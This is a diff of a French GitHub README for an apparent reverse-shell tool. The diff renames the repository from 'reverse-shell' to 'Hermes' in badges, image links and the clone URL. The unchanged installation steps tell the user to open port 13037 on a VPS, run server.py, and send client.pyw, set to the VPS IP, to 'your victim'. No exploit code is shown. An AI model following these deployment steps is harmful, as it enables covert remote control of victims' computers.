@@ -3,14 +3,14 @@
 
 <p align='center'>
   <b>Star ⭐ si vous voulez plus</b><br>
-<i>(English README.md <a href="https://github.com/DictateurMiro/reverse-shell/blob/main/English-README.md">here</a>)</i>
+<i>(English README.md <a href="https://github.com/DictateurMiro/Hermes/blob/main/English-README.md">here</a>)</i>
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/github/languages/top/DictateurMiro/reverse-shell?color=red&style=flat">
-  <img src="https://img.shields.io/github/last-commit/DictateurMiro/reverse-shell?color=red&style=flat">
-  <img src="https://img.shields.io/github/stars/DictateurMiro/reverse-shell?color=red&style=flat&label=Stars">
-  <img src="https://img.shields.io/github/forks/DictateurMiro/reverse-shell?color=red&style=flat&label=Forks">
+  <img src="https://img.shields.io/github/languages/top/DictateurMiro/Hermes?color=red&style=flat">
+  <img src="https://img.shields.io/github/last-commit/DictateurMiro/Hermes?color=red&style=flat">
+  <img src="https://img.shields.io/github/stars/DictateurMiro/Hermes?color=red&style=flat&label=Stars">
+  <img src="https://img.shields.io/github/forks/DictateurMiro/Hermes?color=red&style=flat&label=Forks">
 </p>
 
 ---
@@ -35,19 +35,19 @@ Contact :
 ---
 
 ## ✨ Fonctionnement d'un Reverse Shell
-<img src="https://raw.githubusercontent.com/DictateurMiro/reverse-shell/main/images/fonctionnement%20reverse%20shell.png">
+<img src="https://raw.githubusercontent.com/DictateurMiro/Hermes/main/images/fonctionnement%20reverse%20shell.png">
 
 ---
 
 ## 🎥 Video
-<img src="https://raw.githubusercontent.com/DictateurMiro/reverse-shell/main/images/demo.gif">
+<img src="https://raw.githubusercontent.com/DictateurMiro/Hermes/main/images/demo.gif">
 
 ---
 
 ## 🚀 Installation & Configuration
 
 ```sh-session
-> Téléchargé le fichier (git clone https://github.com/DictateurMiro/reverse-shell.git)
+> Téléchargé le fichier (git clone https://github.com/DictateurMiro/Hermes.git)
 > Ouvrez le port 13037 sur votre vps
 > Lancez server.py
 > Envoyez client.pyw (avec l'ip de votre vps dans le fichier) a votre victime
